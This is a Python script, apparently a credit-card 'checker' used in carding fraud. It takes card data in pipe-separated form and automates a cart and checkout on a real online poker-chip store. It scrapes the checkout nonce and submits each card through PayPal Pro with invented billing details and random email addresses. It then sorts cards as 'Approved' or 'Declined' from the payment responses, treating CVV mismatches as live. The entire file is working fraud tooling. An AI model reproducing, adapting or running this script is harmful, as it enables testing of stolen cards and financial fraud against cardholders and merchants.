import requests
import re
import base64
import json
import names
import random
from fake_useragent import UserAgent
import time
import uuid
import time
from requests import Session
import time
import webbrowser
from bs4 import BeautifulSoup
from dataclasses import dataclass



def paserX(data, first, last):
    try:
        return re.search(f'{first}(.*?){last}', data).group(1)
    except:
        return None 
    
Agent = UserAgent().random

def generar_codigo_session():
    codigo_session = str(uuid.uuid4())
    return codigo_session
@dataclass
class pafiw:
    def main(self, card):
        try:
            
            self.card = card
            self.ccs = card.split('|')
            if self.ccs[0].startswith("4"): self.brand = "VI"
            if self.ccs[0].startswith("3"): self.brand = "AE"
            elif self.ccs[0].startswith("5"): self.brand = "MC"

            session = requests.Session()

            def generar_correo():
                return f"{names.get_first_name()}{names.get_last_name()}{random.randint(1000000,9999999)}@gmail.com"
            CorreoRand = generar_correo()
            session=requests.Session()

            headers = {'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7','accept-language': 'es-US,es-419;q=0.9,es;q=0.8','priority': 'u=0, i','referer': 'https://www.apachepokerchips.com/','upgrade-insecure-requests': '1','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Safari/537.36',}
            response = session.get('https://www.apachepokerchips.com/product/bank-18xx-board-games-poker-chips/', headers=headers)

            headers = {'accept': '*/*','content-type': 'application/x-www-form-urlencoded; charset=UTF-8','origin': 'https://www.apachepokerchips.com', 'priority': 'u=0, i','referer': 'https://www.apachepokerchips.com/product/bank-18xx-board-games-poker-chips/','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Safari/537.36','x-requested-with': 'XMLHttpRequest',}
            data = {'variation_id': '14907','product_id': '14905','add-to-cart': '14905','attribute_packages': '1 Bank chips','quantity': '25','check_149071': '1',}
            response = session.post('https://www.apachepokerchips.com/', headers=headers, data=data)

            headers = {'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7','priority': 'u=0, i','referer': 'https://www.apachepokerchips.com/product/bank-18xx-board-games-poker-chips/', 'upgrade-insecure-requests': '1','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Safari/537.36',}
            response = session.get('https://www.apachepokerchips.com/cart/', headers=headers)

            headers = {'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7', 'priority': 'u=0, i','referer': 'https://www.apachepokerchips.com/cart/','upgrade-insecure-requests': '1','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Safari/537.36',}
            response = session.get('https://www.apachepokerchips.com/checkout/', headers=headers)
            chek = paserX(response.text, 'name="woocommerce-process-checkout-nonce" value="', '"')

            headers = {'accept': 'application/json, text/javascript, */*; q=0.01','content-type': 'application/x-www-form-urlencoded; charset=UTF-8','origin': 'https://www.apachepokerchips.com','priority': 'u=1, i','referer': 'https://www.apachepokerchips.com/checkout/','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Safari/537.36','x-requested-with': 'XMLHttpRequest',}
            params = {'wc-ajax': 'checkout',}

            data = f'wc_order_attribution_source_type=typein&wc_order_attribution_referrer=(none)&wc_order_attribution_utm_campaign=(none)&wc_order_attribution_utm_source=(direct)&wc_order_attribution_utm_medium=(none)&wc_order_attribution_utm_content=(none)&wc_order_attribution_utm_id=(none)&wc_order_attribution_utm_term=(none)&wc_order_attribution_utm_source_platform=(none)&wc_order_attribution_utm_creative_format=(none)&wc_order_attribution_utm_marketing_tactic=(none)&wc_order_attribution_session_entry=https%3A%2F%2Fwww.apachepokerchips.com%2F&wc_order_attribution_session_start_time=2026-05-05+03%3A45%3A03&wc_order_attribution_session_pages=13&wc_order_attribution_session_count=1&wc_order_attribution_user_agent=Mozilla%2F5.0+(Windows+NT+10.0%3B+Win64%3B+x64)+AppleWebKit%2F537.36+(KHTML%2C+like+Gecko)+Chrome%2F147.0.0.0+Safari%2F537.36&billing_first_name=VICTOR&billing_last_name=ENRIQUE&billing_company=&billing_country=US&billing_address_1=7971+NW+21+St&billing_address_2=&billing_city=New+York&billing_state=MI&billing_postcode=10080&billing_phone=%2B5713233753037&billing_email={CorreoRand}&honey_1777953216=&ship_to_different_address=1&shipping_first_name=VICTOR&shipping_last_name=ENRIQUE&shipping_company=&shipping_country=US&shipping_address_1=Street+132&shipping_address_2=&shipping_city=New+York&shipping_state=MI&shipping_postcode=10080&order_comments=&shipping_method%5B0%5D=flat_rate%3A8&payment_method=paypal_pro&paypal_pro-card-number={self.ccs[0]}&paypal_pro-card-exp-month={self.ccs[1]}&paypal_pro-card-exp-year={self.ccs[2]}&paypal_pro-card-cvv={self.ccs[3]}&woocommerce-process-checkout-nonce={chek}&_wp_http_referer=%2F%3Fwc-ajax%3Dupdate_order_review'
            response = session.post('https://www.apachepokerchips.com/', params=params, headers=headers, data=data)
            session.close()
            data = response.json()
            mensaje = data["messages"].split("<li>")[1].split("</li>")[0].strip()
            
            if mensaje == 'None':return 'Approved! ✅', 'Charged $0.25'
            if ' 15004 - This transaction cannot be processed. Please enter a valid Credit Card Verification Number' in mensaje:return 'Approved! ✅','CVV2 Mismatch: 15004-This transaction cannot be processed.'
            else:return 'Declined! ❌', mensaje
        
        except:return 'Declined! ❌', '20003 - This transaction was declined.'